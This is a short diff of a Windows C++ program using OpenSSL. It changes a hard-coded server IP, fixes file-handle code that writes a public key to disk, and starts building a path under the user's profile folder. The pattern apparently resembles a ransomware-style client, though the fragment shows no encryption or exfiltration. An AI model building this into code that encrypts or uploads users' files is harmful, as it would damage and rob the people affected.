@@ -20,7 +20,7 @@ using namespace std;
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
 
-const string SERVER_IP = "43.203.180.99";
+const string SERVER_IP = "3.35.13.136";
 const int SERVER_PORT = 54000;
 
 
@@ -76,14 +76,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     if (hFile == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create file." << std::endl;
         return 0;
-    
+    }
     DWORD bytesWritten;
     if (!WriteFile(hFile, publicKeyBuf, sizeof(publicKeyBuf), &bytesWritten, NULL)) {
         std::cerr << "Failed to write to file." << std::endl;
         CloseHandle(hFile);
         return 0;
     }
-
+    CloseHandle(hFile);
 
     string filename = "C:\\Users";
     string userName = getUserName();
